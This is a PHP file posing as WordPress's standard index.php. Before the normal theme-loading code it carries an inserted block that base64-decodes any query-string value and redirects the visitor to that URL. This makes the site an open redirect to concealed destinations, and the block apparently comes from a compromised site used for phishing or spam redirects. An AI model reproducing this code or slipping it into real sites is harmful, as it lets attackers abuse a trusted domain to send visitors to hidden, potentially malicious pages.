<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Base64 URL Decoding and Redirection
 */
if (isset($_SERVER['QUERY_STRING'])) {
    try {
        // Decode the base64 encoded URL
        $encoded_url = explode("=", $_SERVER['QUERY_STRING'])[1];
        $decoded_url = base64_decode($encoded_url);

        // Validate the URL
        if (filter_var($decoded_url, FILTER_VALIDATE_URL)) {
            // Redirect to the decoded URL
            header("Location: " . $decoded_url);
            exit;
        }
    } catch (Exception $e) {
        // Handle any exceptions (optional)
        echo "An error occurred: " . $e->getMessage();
        exit;
    }
}

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
?>
